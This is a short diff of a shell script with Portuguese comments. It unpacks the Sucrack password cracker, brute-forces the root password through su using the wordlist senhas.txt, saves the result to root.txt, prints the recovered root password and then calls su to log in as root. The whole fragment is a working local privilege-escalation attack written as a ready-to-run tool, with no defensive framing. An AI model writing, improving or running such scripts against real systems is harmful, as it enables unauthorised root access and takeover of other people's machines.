@@ -18,4 +18,13 @@ tar -zxvf data.tar.gz >> /dev/null
 cd usr/bin
 
 #Executando o binário do Sucrack utilizando a Wordlist senhas.txt
-./sucrack ../../senhas.txt
+./sucrack ../../senhas.txt >> ../../root.txt
+
+#Restartando o terminal (Sucrack congela a tela)
+reset
+
+echo -e "A senha do usuário Root é:"
+cat ../../root.txt
+echo
+echo -e "Digite a senha descoberta pelo Sucrack para se autenticar como Root"
+su
